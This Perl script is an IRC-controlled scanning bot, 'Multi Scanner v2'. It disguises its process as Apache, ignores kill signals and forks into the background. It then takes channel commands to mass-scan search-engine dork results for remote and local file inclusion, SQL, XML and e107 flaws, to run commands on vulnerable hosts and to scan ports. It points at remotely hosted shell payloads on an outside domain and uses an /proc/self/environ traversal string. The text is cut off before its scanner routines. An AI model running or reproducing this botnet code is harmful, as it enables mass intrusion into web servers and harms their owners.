#!/usr/bin/perl
$powered="stealth";
$mail="admin(at)makam.us";
  #####################################################################################
  ##                                                                                 ##
  ##                                                                   01/01/2011    ##
  ##  Author  : arch_fajri, dedemit                                                  ##
  ##  Team    : Irc.lampungcyber.org                                                 ##
  ##                                                                                 ##
  ##  ## IMPORTANT ##                                                                ##
  ##   # ONLY FOR EDUCATIONAL PURPOSE. THE AUTHOR IS NOT RESPONSABLE OF ANY          ##
  ##   # IMPROPERLY USE OF THIS TOOL. USE IT AT YOUR OWN RISK !!                     ##
  ##   # THIS TOOL HAS BEEN MADE TO HELP NET ADMINISTRATORS TO MAKE THEIR            ##
  ##   # SYSTEM MORE SECURE.                                                         ##
  ##  ##                                                                             ##
  ##                                                                                 ##
  ##  Features:                                                                      ##
  ##    [+]e107 Injection Scanner                                                    ##
  ##    [+]Sql Injection Scanner                                                     ##
  ##    [+]XML (Extensible Markup Language) Injection Scanner                        ##
  ##    [+]Remote File Inclusion Scanner                                             ##
  ##    [+]Local File Inclusion Scanner                                              ##
  ##    [+]Integrated Shell, so you can execute commands on the server               ##
  ##    [+]Spread Mode, to activate or disable Spread Function                       ##
  ##    [+]admin finder                       					     ##
  ##    [+]md5						                             ##
  ##    [+]port scan					                             ##
  ##    [+]ip chek     					                             ##
  ##    [+]base64					                             ##
  ##    [+]dns						                             ##  
  ##                                                                                 ##
  #####################################################################################
use HTTP::Request;
use LWP::UserAgent;
use IO::Socket;
use IO::Select;
use IO::Socket::INET;
use Socket;
use HTTP::Request::Common;
use LWP::Simple;
use LWP 5.64;
use HTTP::Request::Common qw(POST);
use Digest::MD5 qw(md5_hex);
use MIME::Base64;
##############################################################
my $fakeproc  	= "/usr/sbin/apache2 -k start"; 
$ircserver    	= $ARGV[0] unless $ircserver;
my $ircport   	= $ARGV[1];
my $nickname  	= $ARGV[2];
my $ident     	= $ARGV[3];
my $channel   	= '#'.$ARGV[4];
my $chanx  	= '#'.$ARGV[5];
my $runner    	= $ARGV[6];
my $fullname    = `hostname`;
##############################################################
my $rspo_test   = "../../../../../../../../../../../../../../../proc/self/environ%00";
my $rspo_shell  = "http://cherrysuede.com/cache/mod_acymailing/f.txt??";
my $rfiid   	= "http://cherrysuede.com/cache/mod_acymailing/sb2.txt??";
my $shell   	= "http://cherrysuede.com/cache/mod_acymailing/f.txt??";
my $perl     	= "http://cherrysuede.com/cache/mod_acymailing/a.txt";
my $perl2   	= "http://cherrysuede.com/cache/mod_acymailing/sb.txt";
my $php   	= "http://cherrysuede.com/cache/mod_acymailing/pdosa.txt?";
my $perlbase   	= "";
my $phpbase   	= "";
##############################################################
my @User_Agent = &Agent();
my $success   = "\n [+] scaner Multiscanner\n [-] Loading Successfully ...\n [-] Process/PID : $fakeproc - $$\n";
my $failed    = "\n [-] perl $0 <host> <port> <botnick> <botident> <channel> <chanx> <runner>\n\n";
if (@ARGV != 7) { print $failed; exit(); } else { print $success; }
##############################################################
$SIG{'INT'}   	= 'IGNORE';
$SIG{'HUP'}   	= 'IGNORE';
$SIG{'TERM'}  	= 'IGNORE';
$SIG{'CHLD'}  	= 'IGNORE';
$SIG{'PS'}    	= 'IGNORE';
##############################################################
chdir("/tmp");
$ircserver="$ARGV[0]" if $ARGV[0];
$0 = "$fakeproc"."\0"x16;;
&SIGN();
my $pid = fork;
exit if $pid;
die "\n [!] Something Wrong !!!: $!" unless defined($pid);
our %irc_servers;
our %DCC;
my $dcc_sel = new IO::Select->new();
$sel_client = IO::Select->new();
sub sendraw {
    if ($#_ == '1') {
    my $socket = $_[0];
    print $socket "$_[1]\n";
    } else {
        print $IRC_cur_socket "$_[0]\n";
    }
}
##############################################################
sub connector {
    my $mynick = $_[0];
    my $ircserver_con = $_[1];
    my $ircport_con = $_[2];
    my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$ircserver_con", PeerPort=>$ircport_con) or return(1);
    if (defined($IRC_socket)) {
        $IRC_cur_socket = $IRC_socket;
        $IRC_socket->autoflush(1);
        $sel_client->add($IRC_socket);
        $irc_servers{$IRC_cur_socket}{'host'} = "$ircserver_con";
        $irc_servers{$IRC_cur_socket}{'port'} = "$ircport_con";
        $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        $irc_servers{$IRC_cur_socket}{'myip'} = $IRC_socket->sockhost;
        nick("$mynick");
        sendraw("USER $ident ".$IRC_socket->sockhost." $ircserver_con :$fullname");
        sleep 1;
    }
}
##############################################################
sub parse {
    my $servarg = shift;
    if ($servarg =~ /^PING \:(.*)/) {
        sendraw("PONG :$1");
    } elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
        my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;
        if ($args =~ /^\001VERSION\001$/) {
            notice("$pn", "\001VERSION mIRC v6.17 Khaled Mardam-Bey\001");
        }
        if ($args =~ /^(\Q$mynick\E|\!a)\s+(.*)/ ) {
            my $natrix = $1;
            my $arg = $2;
        }
    }
    elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
        if (lc($1) eq lc($mynick)) {
            $mynick=$4;
            $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        }
    } elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
        nick("$mynick|".int rand(9999));
    } elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
        $mynick = $2;
        $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        $irc_servers{$IRC_cur_socket}{'nome'} = "$1";
        sendraw("MODE $nickname +Bx");
        sendraw("JOIN $channel");
        sendraw("JOIN $chanx");
        sendraw("JOIN $channel");
        sendraw("PRIVMSG $chanx : $fullname ");
    }
}
##############################################################
my $line_temp;
while( 1 ) {
    while (!(keys(%irc_servers))) { connector("$nickname", "$ircserver", "$ircport"); }
    delete($irc_servers{''}) if (defined($irc_servers{''}));
    my @ready = $sel_client->can_read(0);
    next unless(@ready);
    foreach $fh (@ready) {
        $IRC_cur_socket = $fh;
        $mynick = $irc_servers{$IRC_cur_socket}{'nick'};
        $nread = sysread($fh, $msg, 4096);
        if ($nread == 0) {
            $sel_client->remove($fh);
            $fh->close;
            delete($irc_servers{$fh});
        }
        @lines = split (/\n/, $msg);
        $msg =~ s/\r\n$//;
##############################################################
##			   bantuan 			    ##
##############################################################
        if ($msg=~ /PRIVMSG $channel :!help/){
	    sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<<4@12help15>> 12 !rfi  bug dork  ");
	    sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<<4@12help15>> 12 !lfi  bug dork  ");
	    sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<<4@12help15>> 12 !sql  bug dork  ");
	    sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<<4@12help15>> 12 !xml  bug dork  ");
	    sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<<4@12help15>> 12 !e107 dork  ");
	    sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<<4@12help15>> 12 !portscan <ip>  ");
	    sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<<4@12help15>> 12 !login <admin finder>  ");
            sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<<4@12help15>> 12 !dns | !port | !md5 | !ip | !base64 | !proxy  ");
            sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<<4@12help15>> 12 !cmde107 | !cmdlfi | !cmdxml  ");
        }
        if ($msg=~ /PRIVMSG $channel :!version/){
            sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<<4@12version15>> 12Multi Scanner v2 ");
        }
        if ($msg=~ /PRIVMSG $channel :!engine/){
            sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<<4@12engine15>> 14-> 12Yamaha'75 ");
        }
        if ($msg=~ /PRIVMSG $channel :!pid/){
            sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<<4@12pid15>> 12Process/ID : 4 $fakeproc - $$ ");
        }
        if ($msg=~ /PRIVMSG $channel :!about/){
            sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<<4@12about15>> 12Multi Scanner v2 ");
            sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<<4@12about15>> 12Coded by BaMbY  ");
            sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<<4@12about15>> 12Copyright @2010 ByroeNet ");
            sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<<4@12about15>> 12Modified by stealth #maniak ByroeNet:Modified 2 by Slow_D ");
        }
	if ($msg=~ /PRIVMSG $channel :!respon/){
		my $re = query($rfiid);
		if ( $re =~ /ByroeNet/ ) {
                sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<<4@12respon15>> 12Respon 4Jalan ! ");
            }
            else {
                sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<<4@12respon15>> 12Respon 4Macet ! ");
            }
        }
##############################################################
	if ($msg=~ /PRIVMSG $channel :!pergi\s+(.*)/){
		my $cnls = $1;
		&quit($cnls);
	}
##############################################################
##                           proxy                          ##
##############################################################
	if ($msg=~ /PRIVMSG $channel :!proxy\s+(.*?)\s+(.*)/){
		my $port = $1;
		my $type = $2;
		&proxy($port,$type);
	}
##############################################################
##                            dns                           ##
##############################################################
	if ($msg=~ /PRIVMSG $channel :!dns\s+(.*)/){
		my $nsku = $1;
		$mydns = inet_ntoa(inet_aton($nsku));
		sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<<4@12dns15>> 1$nsku <=> $mydns ");
	}
##############################################################
##                            port                          ##
##############################################################
	if ($msg=~ /PRIVMSG $channel :!port\s+(.*?)\s+(.*)/ ) {
            my $hostip= "$1";
            my $portsc= "$2";
            my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $portsc, Proto =>'tcp', Timeout => 5);
            if ($scansock) {
	            sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<<4@12port15>> 12Koneksi ke $hostip:$portsc 12Diterima ");}
            else {
                sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<<4@12port15>> 12Koneksi ke $hostip:$portsc 12Gagal ");}
        }
##############################################################
##                     lfi/xml/e107 cmd                     ##
##############################################################
	if ($msg=~ /PRIVMSG $channel :!cmdlfi\s+(.*?)\s+(.*)/){
		my $url = $1."../../../../../../../../../../../../../../../proc/self/environ%00";
		my $cmd = $2;
		&cmdlfi($url,$cmd);
	}
	if ($msg=~ /PRIVMSG $channel :!cmdxml\s+(.*?)\s+(.*)/){
		my $url = $1;
		my $cmd = $2;
		&cmdxml($url,$cmd);
	}
	if ($msg=~ /PRIVMSG $channel :!cmde107\s+(.*?)\s+(.*)/){
		my $url = $1;
		my $cmd = $2;
		&cmde107($url,$cmd);
	}
##############################################################
##                        md5 respond                       ##
##############################################################
	if ($msg=~ /PRIVMSG $channel :!md5 (.*)$/ ) {
	if (my $pid = fork) {
	waitpid($pid, 0);
	} else {
	if (fork) {
	exit;
	} else {
	my $hash      = $1;
	sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<< 4@ 12md5 15>> 12Try to Convert: 12 $hash  ");
	my $cracker   = "http://md5.rednoize.com/?s=md5&q=".$hash;
	my $request   = HTTP::Request->new(GET=>$cracker);
	my $useragent = LWP::UserAgent->new();
	$useragent->timeout(10);
	my $response  = $useragent->request($request);
	if ($response->is_success) {
		my $res  = $response->content;
		if ($res =~ m/<div id=\"result\" >(.*)<\/div>/g) {
		my $result = $1;
		sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<<4@12md515>> 12 Result: 12 $hash  0=> 12 $result  ");
			}
		else {
			sendraw($IRC_cur_socket, "PRIVMSG $channel :15<<4@12md515>> 12 ".$hash." 12not found.  ");
			}
		}
	        else { sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<<4@12md515>> 12 Cannot open DataBase  "); }
		}
	exit;
	  }
	}
##############################################################
##                        ip respond                        ##
##############################################################
	if ($msg=~ /PRIVMSG $channel :!ip\s+(.*)/ ) {
	if (my $pid = fork) {
	waitpid($pid, 0);
	} else {
	if (fork) {
	exit;
	} else {
	my $ip = $1;
	sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<<4@12ip15>> 12Searching 12 ".$ip." 12Location ... ");
	my $website = "http://www.ipligence.com/geolocation";
	my ($useragent,$request,$response,%form);
	undef %form;
	$form{ip}  = $ip;
	$useragent = LWP::UserAgent->new;
	$useragent->timeout(10);
	$request   = POST $website,\%form;
	$response  = $useragent->request($request);
	if ($response->is_success) {
		my $res = $response->content;
		if ($res =~ m/Your IP address is (.*)<br>City: (.*)<br\/>Country: (.*)<br>Continent: (.*)<br>Time/g) {
			my ($ipaddress,$city,$country,$continent) = ($1,$2,$3,$4);
			sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<<4@12ip15>> 12IP Address : 12 ".$ipaddress." ");
			sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<<4@12ip15>> 12City       : 12 ".$city." ");
			sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<<4@12ip15>> 12Country    : 12 ".$country." ");
			sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<<4@12ip15>> 12Continent  : 12 ".$continent." ");
				}
		else { sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<<4@12ip15>> 12$ip 12-> 4Invalid address or IP not found."); }
			}
		else { sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<<4@12ip15>> 12Cannot open IP-DB"); }
		    }
	exit;
	  }
	}
##############################################################
##                      base64 respond                      ##
##############################################################
	if ($msg=~ /PRIVMSG $channel :!base64 (.*)$/ ) {
	if (my $pid = fork) {
	waitpid($pid, 0);
	} else {
	if (fork) {
	exit;
	} else {
	my $hash      = $1;
	sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<<4@12base6415>> 12Try To Convert : 1 $hash  ");
	my $base64_encoded = encode_base64($hash);
	my $base64_decoded = decode_base64($hash);
	sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<< 4@ 12base64 15>>   12Decode : 1 $base64_decoded  ");
	sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<< 4@ 12base64 15>>   12Encode : 1 $base64_encoded  ");
		}
	  exit;
	  }
	}
##############################################################
##                         portscan                         ##
##############################################################
if ($msg =~ /PRIVMSG $channel :!portscan (.*)$/ ) {
  my $hostip="$1";
  my
  @portas=("15","19","98","20","21","22","23","25","37","39","42","43","49","53","63","69","79","80","101","106","107","109","110","111","113","115","117","119","135","137","139","143","174","194","389","389","427","443","444","445","464","488","512","513","514","520","540","546","548","565","609","631","636","694","749","750","767","774","783","808","902","988","993","994","995","1005","1025","1033","1066","1079","1080","1109","1433","1434","1512","2049","2105","2432","2583","3128","3306","4321","5000","5222","5223","5269","5555","6660","6661","6662","6663","6665","6666","6667","6668","6669","7000","7001","7741","8000","8018","8080","8200","10000","19150","27374","31310","33133","33733","55555");
  my (@aberta, %porta_banner);
  sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<4@12portscan15> 12Loading port scanner .");
  foreach my $porta (@portas)  {
    my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto =>
    'tcp', Timeout => 4);
    if ($scansock) {
      push (@aberta, $porta);
      $scansock->close;
    }
  }
  
  if (@aberta) {
    sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<4@12portscan15> 12 open ports are...: 5 @aberta");
    } else {
    sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<4@12portscan15> 12 all ports are closed ");
  }
}
##############################################################
##                       admin login                       ##
##############################################################
                if ($msg=~ /PRIVMSG $channel :!login (.*)$/ ) {
                if (my $pid = fork) {
                waitpid($pid, 0);}
                else {
                if (fork) {     exit; } else {
                my $test = $1 ;
                @index = ('/admin/','/ADMIN/','/login/','/adm/','/cms/','/administrator/','/admin/login.php','/ADMIN/login.php','/admin/home.php','/admin/controlpanel.html','/admin/controlpanel.php','/admin.php','/admin.html','/admin/cp.php','/admin/cp.html','/cp.php','/cp.html','/controlpanel/','/panelc/','/administrator/index.php','/administrator/login.html','/administrator/login.php','/administrator/account.html','/administrator/account.php','/administrator.php','/administrator.html','/login.php','/login.html','/controlpanel/','/administration/','/administration.php','/administration.html','/phpmyadmin/','/myadmin/','/wp-admin/','/webadmin/','/webadmin.php','/webadmin.html','/admins/','/admins.php','/admins.html','/WebAdmin/','/admin1/','/panel/','/cpanel/','/cPanel/','/members/','/wp-login/','  --> Finish!!');
                sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<4@ 12LoginFinder15> 12Searching Admin login 7 ".$test." ...  ");               
                foreach $scan(@index){
                $url = $test.$scan;
                $request = HTTP::Request->new(GET=>$url);
                $useragent = LWP::UserAgent->new();
                $response = $useragent->request($request);
                if ($response->is_success && $response->content =~ /Admin Area/ || $response->content =~ /Password/ || $response->content =~ /welcome/ || $response->content =~ /admin area/ || $response->content =~ /passwd/ || $response->content =~ /username/) { 
                        $msg = " 3Ok!!";
                                                        }
				else { $msg = "4forbidden!!";}
                        sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<4@12LoginFinder15> 12 $url 15< $msg 15>  ");
                        sleep 1;
                        }
                  }
                exit;
                }}
##############################################################
##                      Exploitasi lfi                      ##
##############################################################
if ($msg=~ /PRIVMSG $channel :!lfi\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "google";
            my $bugx = $1;
            my $d0rk = $2;
            sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<4@12scaner-lfi15> 12 Loading lfi scanner... ");
            &scanerlfi($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!lfi\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "lfi15> 1215<4@12gfind";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerlfi($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!lfi\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "lfi15> 1215<4@12alltheweb";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerlfi($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!lfi\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "lfi15> 1215<4@12altavista";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerlfi($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!lfi\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "lfi15> 1215<4@12yahoo";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerlfi($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!lfi\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "lfi15>  1215<4@12msn";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerlfi($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!lfi\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "lfi15> 1215<4@12virgillio";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerlfi($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!lfi\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "lfi15> 1215<4@12ask";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerlfi($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!lfi\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "lfi15> 1215<4@12uol";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerlfi($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!lfi\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "lfi15> 1215<4@12lycos";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerlfi($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!lfi\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "lfi15> 1215<4@12snz";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerlfi($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!lfi\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "lfi15> 1215<4@12seznam";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerlfi($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!lfi\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "lfi15> 1215<4@12szukacz";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerlfi($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!lfi\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "lfi15> 1215<4@12kvasir";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerlfi($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!lfi\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "lfi15> 1215<4@12ixquic";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerlfi($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!lfi\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "lfi15> 1215<4@12libero";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerlfi($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!lfi\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "lfi15> 1215<4@12tiscali";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerlfi($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!lfi\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "lfi15> 1215<4@12gigablast";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerlfi($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!lfi\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "lfi15> 1215<4@12sapo";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerlfi($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!lfi\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "lfi15> 1215<4@12naver";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerlfi($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!lfi\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "lfi15> 1215<4@12rediff";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerlfi($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!lfi\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "lfi15> 1215<4@12walla";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerlfi($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!lfi\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "lfi15> 1215<4@12aol";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerlfi($engx,$bugx,$d0rk);
        }
        exit;
    }
}
##############################################################
##                      Exploitasi xml                      ##
##############################################################
if ($msg=~ /PRIVMSG $channel :!xml\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "xml15> 1215<4@12google";
            my $bugx = $1;
            my $d0rk = $2;
            sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<4@12scaner-xml15> 12Loading xml scanner... ");
            &scanerxml($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!xml\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "xml15> 1215<4@12gfind";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerxml($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!xml\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "xml15> 1215<4@12alltheweb";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerxml($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!xml\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "xml15> 1215<4@12altavista";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerxml($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!xml\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "xml15> 1215<4@12yahoo";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerxml($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!xml\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "xml15> 1215<4@12msn";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerxml($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!xml\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "xml15> 1215<4@12virgillio";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerxml($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!xml\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "xml15> 1215<4@12ask";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerxml($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!xml\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "xml15> 1215<4@12uol";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerxml($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!xml\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "xml15> 1215<4@12lycos";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerxml($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!xml\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "xml15> 1215<4@12snz";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerxml($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!xml\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "xml15> 1215<4@12seznam";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerxml($engx,$bugx,$d0rk);
        }
        exit;
    }
}

